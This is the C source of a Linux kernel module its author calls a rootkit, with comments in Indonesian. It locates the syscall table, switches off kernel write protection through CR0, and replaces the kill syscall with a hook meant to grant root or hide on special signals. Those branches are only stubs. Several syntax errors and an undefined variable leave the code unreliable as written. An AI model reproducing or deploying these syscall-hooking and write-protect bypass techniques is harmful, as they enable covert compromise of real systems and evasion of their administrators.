#include <linux/init.h>                             // Header untuk memulai program agar dapat menggunakan __init dan __exit
#include <linux/module.h>                           // Core header untuk memuat Module pada kernel
#include <linux/kernel.h>                           // Header yang di perlukan untuk type, function, macros dan lainnya seperti KERN_INFO
#include <linux/kallsyms.h>                         // Header untuk menggunakan kallsyms_lookup_name 
#include <linux/unistd.h>                           // Header di gunakan untuk syscall numbers
#include <linux/version.h>                          // Linux/Kernel ex: LINUX_VERSION_CODE KERNEL_VERSION
#include <linux/dirent.h>                           // Contains dirent struck etc
#include <asm/paravirt.h>                           // Function read_cr0 : read control register 0


/*  Module Information */
MODULE_LICENSE("GPL");                              // Penting! untuk mencegah error dan juga menggunakan function dengan baik 
MODULE_AUTHOR("lodwig");
MODULE_DESCRIPTION("Linux Kernel Module for rootkit by Hengki Lodwig")
MODULE_VERSION("0.0.1")

unsigned long *__sys_call_table; // = NULL;             // Pointer untuk address function yang akan di panggil NULL --(void*)0

#ifdef CONFIG_X86_64
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
#define PTREGS_SYSCALL_STUB 1
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
static ptregs_t orig_kill;
#else
typedef asmlinkage long (*orig_kill_t)(pid_t pid, int sig);
static orig_kill_t orig_kill;
#endif
#endif


enum signals {
    SIGSUPER = 64,              // become root
    SIGINVIS = 63,               // become invisible
};

#if PTREGS_SYSCALL_STUB

static asmlinkage long hack_kill(const struct pt_regs *regs)
{
    int sig = regs->si

    if(sig == SIGSUPER){
        printk(KERN_INFO "signal: %d == SIGSUPER: %d | become root", sig, SIGSUPER);
        return 0;
    } else if (sig == SIGINVIS){
        printk(KERN_INFO "signal: %d == SIGINVIS: %d | malware mode on", sig, SIGINVIS);
        return 0;
    }

    return orig_kill(regs);
}

#else 

static asmlinkage long hack_kill(pid_t pid, int sig)
{

    if(sig == SIGSUPER){
        printk(KERN_INFO "signal: %d == SIGSUPER: %d | become root", sig, SIGSUPER);
        return 0;
    } else if (sig == SIGINVIS){
        printk(KERN_INFO "signal: %d == SIGINVIS: %d | malware mode on", sig, SIGINVIS);
        return 0;
    }

    printk(KERN_INFO "***** hacked kill syscall *****\n");
    return orig_kill(regs);                 // <-- this would trigger error undefined `regs`  
}

#endif


static int cleanup(void)
{
    /* kill */
    __sys_call_table[__NR_kill] = (unsigned long)orig_kill;
    return 0;
}


static int store(void)
{
/** if LINUX_VERSION_CODE >= KERNEL_VERSION(4 ,17 ,0)syscall use pt_regs_stub */
#if PTREGS_SYSCALL_STUB
    orig_kill = (ptregs_t)__sys_call_table[__NR_kill];
    printk(KERN_INFO "orig_kill table entry successfully stored\n");
#else
    orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
    printk(KERN_INFO "orig_kill table entry successfully stored\n");
#endif

    return 0;
}



static int hook(void)
{

    printk(KERN_INFO "hooked function\n");
    /** kill */
    __sys_call_table[__NR_kill] = (unsigned long)&hack_kill;

    return 0;
}


/* Custom write_cr0 function to get passed trap */
static inline void write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;

    /* __asm__ __volatile__( */
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
        /**
         * To prevent reads from being reordered with
         * respect to writes, use dummy memory operand.
         * "+m"(__force_order)
         */
}

/* Disable write protection */
static void unprotect_memory(void)
{
    /**
     * Bitwise AND (&) copies bit to result if it is in both operands
     * Unary reverse (~) reverses the bits so ~0x10000 becomes ~0x01111 */
    write_cr0_forced(read_cr0() & (~ 0x10000));
    printk(KERN_INFO "unprotected memory\n");
}

/* Enable write protection */
static void protect_memory(void)
{
    /*** Bitwise OR (|) copies bit to result if it is in either operands */
    write_cr0_forced(read_cr0() | (0x10000));
    printk(KERN_INFO "protected memory\n");
}



static unsigned long *get_syscall_table(void)
{
    unsigned long *syscall_table;

/* Prepocessor directif checking */
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)X
    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
#else
    syscall_table = NULL;                               // (void*)0
#endif    

    return syscall_table;
}


static int __init mod_mulai(void)
{
    int err = 1;
    printk(KERN_INFO "Dodol: Mulai\n");

    __sys_call_table = get_syscall_table();
    if(!__sys_call_table){
        printk(KERN_INFO "error: __sys_call_table == null\n");
        return err;
    }

    if(store() == err){
        printk(KERN_INFO "error: store error\n");
    }

    unprotect_memory();

    if(hook() == err){
        printk(KERN_INFO "error: hook error\n");
    }

    protect_memory();

    return 0;
}

static void __exit mod_selesai(void)
{
    int err = 1;
    printk(KERN_INFO "Dodol: Selesai\n");

    /** Clean Up */
    unprotect_memory();

    if(cleanup() == err){
        printk(KERN_INFO "error: cleanup error\n");
    }

    protect_memory();
}


module_init(mod_mulai);
module_exit(mod_selesai);